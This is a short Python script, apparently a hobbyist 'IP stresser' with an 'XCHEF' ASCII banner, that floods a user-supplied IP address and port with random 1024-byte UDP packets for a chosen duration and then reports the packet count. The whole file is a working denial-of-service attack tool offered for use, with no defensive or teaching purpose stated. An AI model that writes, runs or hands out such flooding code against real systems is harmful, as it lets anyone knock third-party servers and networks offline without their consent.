import socket
import random
import threading
import time



print (r"""

$$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$$\       $$$$$$\ $$$$$$$\         $$$$$$\ $$$$$$$$\ $$$$$$$$\  $$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$$\  
$$ |  $$ |$$  __$$\ $$ |  $$ |$$  _____|$$  _____|      \_$$  _|$$  __$$\       $$  __$$\\__$$  __|$$  _____|$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
\$$\ $$  |$$ /  \__|$$ |  $$ |$$ |      $$ |              $$ |  $$ |  $$ |      $$ /  \__|  $$ |   $$ |      $$ /  \__|$$ /  \__|$$ |      $$ |  $$ |
 \$$$$  / $$ |      $$$$$$$$ |$$$$$\    $$$$$\            $$ |  $$$$$$$  |      \$$$$$$\    $$ |   $$$$$\    \$$$$$$\  \$$$$$$\  $$$$$\    $$$$$$$  |
 $$  $$<  $$ |      $$  __$$ |$$  __|   $$  __|           $$ |  $$  ____/        \____$$\   $$ |   $$  __|    \____$$\  \____$$\ $$  __|   $$  __$$< 
$$  /\$$\ $$ |  $$\ $$ |  $$ |$$ |      $$ |              $$ |  $$ |            $$\   $$ |  $$ |   $$ |      $$\   $$ |$$\   $$ |$$ |      $$ |  $$ |
$$ /  $$ |\$$$$$$  |$$ |  $$ |$$$$$$$$\ $$ |            $$$$$$\ $$ |            \$$$$$$  |  $$ |   $$$$$$$$\ \$$$$$$  |\$$$$$$  |$$$$$$$$\ $$ |  $$ |
\__|  \__| \______/ \__|  \__|\________|\__|            \______|\__|             \______/   \__|   \________| \______/  \______/ \________|\__|  \__|
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
""")








def udp_flood(ip, port, duration):
    timeout = time.time() + duration
    bytes = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0

    while True:
        if time.time() > timeout:
            break
        else:
            pass

        sock.sendto(bytes, (ip, port))
        sent += 1

    return sent

ip = input("Enter the target IP address: ")
port = int(input("Enter the target port: "))
duration = int(input("Enter the attack duration in seconds: "))

print("Starting UDP flood attack on %s:%d for %d seconds..." % (ip, port, duration))
packets_sent = udp_flood(ip, port, duration)
print("Attack completed! Sent %d packets to %s:%d." % (packets_sent, ip, port))

input ("Press enter to close")
